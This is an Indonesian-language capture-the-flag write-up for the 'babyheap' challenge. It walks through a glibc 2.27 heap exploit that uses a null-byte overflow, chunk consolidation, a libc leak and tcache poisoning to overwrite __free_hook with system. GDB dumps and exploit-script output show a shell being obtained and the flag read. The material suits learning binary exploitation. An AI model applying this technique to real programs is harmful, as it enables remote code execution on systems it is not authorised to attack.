# babyheap


## Analisa


Seperti biasa, kita lihat hasil command `file` dan `checksec` program:
```
$ file babyheap; checksec babyheap
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=4d76020ee57d2c32de45f8d5a136cd449c0dd105, not stripped
[*] '/home/tempest/projects/cscctf/2019/qual/pwn/babyheap/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```
Program memiliki proteksi penuh.


Bug merupakan **null-byte overflow** pada fungsi `create`. Dengan bug ini kita dapat melakukan overwrite ke heap chunk berikutnya.

```
gef> tel $r12-0x10 4
0x00005555557572e0|+0x0000: 0x0000000000000090 -> chunk yang baru dimalloc
0x00005555557572e8|+0x0008: 0x00000000000000a0
0x00005555557572f0|+0x0010: "????????"	<-$rsi, $r12
0x00005555557572f8|+0x0018: 0x0000000000000000
gef> tel $r12+$rax-8 4
0x0000555555757380|+0x0000: 0x0000000000000130 -> fake prevsize
0x0000555555757388|+0x0008: 0x0000000000000101 -> chunk target
0x0000555555757390|+0x0010: "????????"
0x0000555555757398|+0x0018: 0x0000000000000000
```


Overwrite ini menyebabkan chunk yang baru saja kita malloc, dianggap sudah di-free oleh malloc (karena bit PREV_IN_USE 0).



## Eksploitasi



Bagaimana kita mendapatkan Remote Code Execution pada program ini ? Program menggunakan libc-2.27, yang artinya [sistem tcache](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache/) diterapkan. Tcache tidak menggunakan bit PREV_IN_USE, [small dan largebin](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks.html) yang menggunakannya; jadi pertama-tama kita harus mengisi tcache hingga penuh terlebih dulu (7 chunks). Kita isi tcache dengan dua size berbeda (dalam kasus ini, saya menggunakan 0x88 dan 0xf8), masing-masing dilakukan free sebanyak 7 kali. Dengan bit PREV_IN_USE yang kita nullkan, kita dapat menyatukan (consolidate) smallbin target dengan chunk yang kita malloc sebelumnya, walaupun chunk yang telah kita malloc masih digunakan.


```
gef> tel $rdi-0x10-0x130 4
0x0000555555757250|+0x0000: 0x0000000000000000 -> smallbin pertama, sudah di-free
0x0000555555757258|+0x0008: 0x0000000000000091
0x0000555555757260|+0x0010: 0x0000155555326ca0 -> 0x0000555555757fd0 -> 0x0000000000000000
0x0000555555757268|+0x0018: 0x0000155555326ca0 -> 0x0000555555757fd0 -> 0x0000000000000000
gef> tel $rdi-0x10-0xa0 4
0x00005555557572e0|+0x0000: 0x0000000000000090 -> prevsize dari free
0x00005555557572e8|+0x0008: 0x00000000000000a0 -> tcache, masih digunakan
0x00005555557572f0|+0x0010: "????????"
0x00005555557572f8|+0x0018: 0x0000000000000000
gef> tel $rdi-0x10 4
0x0000555555757380|+0x0000: 0x0000000000000130 -> fake prevsize (0x90+0xa0)
0x0000555555757388|+0x0008: 0x0000000000000100 -> smallbin target, bit PREV_IN_USE 0
0x0000555555757390|+0x0010: "????????"	<-$rdi
0x0000555555757398|+0x0018: 0x0000000000000000
``` 


Berikut state malloc setelah dilakukan free terhadap chunk target:
```
gef> tel $2-0x10-0x130 4
0x0000555555757250|+0x0000: 0x0000000000000000 -> smallbin pertama, sudah disatukan
0x0000555555757258|+0x0008: 0x0000000000000231
0x0000555555757260|+0x0010: 0x0000155555326ca0 -> 0x0000555555757fd0 -> 0x0000000000000000
0x0000555555757268|+0x0018: 0x0000155555326ca0 -> 0x0000555555757fd0 -> 0x0000000000000000
```


Kemudian untuk mendapatkan leak libc (program dilengkapi dengan ASLR), kita terlebih dulu mengalokasikan chunk berukuran 0x80 sebanyak 7 kali agar kita bisa mendapatkan smallbin pertama. Selanjutnya alokasikan smallbin chunk dengan ukuran 0x80, agar [last remainder](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks.html#last-remainder-chunk) berada tepat di atas chunk yang sudah disatukan (namun masih kita gunakan).


```
gef> tel $1-0x10-0x90 2
0x0000555555757250|+0x0000: 0x0000000000000000
0x0000555555757258|+0x0008: 0x0000000000000091 -> smallbin, sedang digunakan
gef> tel $1-0x10 4
0x00005555557572e0|+0x0000: 0x0000000000000090 -> prevsize
0x00005555557572e8|+0x0008: 0x00000000000001a1 -> last remainder, sedang digunakan
0x00005555557572f0|+0x0010: 0x0000155555326ca0 -> 0x0000555555757fd0 -> 0x0000000000000000
0x00005555557572f8|+0x0018: 0x0000155555326ca0 -> 0x0000555555757fd0 -> 0x0000000000000000
```


Kita dapat memanggil fungsi `show` agar mendapatkan leak tersebut. Setelah ini, kita hanya perlu melakukan [tcache poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c) terhadap chunk yang sudah disatukan dengan mengalokasikan chunk baru berukuran 0x90 dan melakukan free agar kita dapat mengalokasikan sebuah heap chunk di **\_\_free\_hook**.



Berikut state tcache ketika sudah di poison:
```
gef> tel $1-0x2f0+0x90 2
0x0000555555757090|+0x0000: 0x00001555553288e8 -> 0x0000000000000000
0x0000555555757098|+0x0008: 0x0000000000000000
gef> p &__free_hook
$3 = (void (**)(void *, const void *)) 0x1555553288e8 <__free_hook>
```


Berikut state malloc ketika akan dilakukan free, setelah **\_\_free\_hook** teroverwrite:
```
gef> tel $rdi 1
0x0000555555757fe0|+0x0000: 0x0068732f6e69622f ("/bin/sh"?)
gef> tel &__free_hook 1
0x00001555553288e8|+0x0000: 0x0000155554f8a440 -> <system+0> test rdi, rdi
```


Output script:
```
$ python exploit.py go
[*] '/home/tempest/projects/cscctf/2019/qual/pwn/babyheap/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to babyheap.problem.cscctf.com on port 11113: Done
[*] libc leak: 0x7ff2ca574ca0
[*] libc base: 0x7ff2ca189000
[*] __free_hook: 0x7ff2ca5768e8
[*] Switching to interactive mode
$ cat /home/babyheap/flag
CCC{wh0_woulDv3_ThOugHt_ThaT_Th1S_C4m3_Fr0m_Off_by_one}
$ 
[*] Closed connection to babyheap.problem.cscctf.com port 11113
```
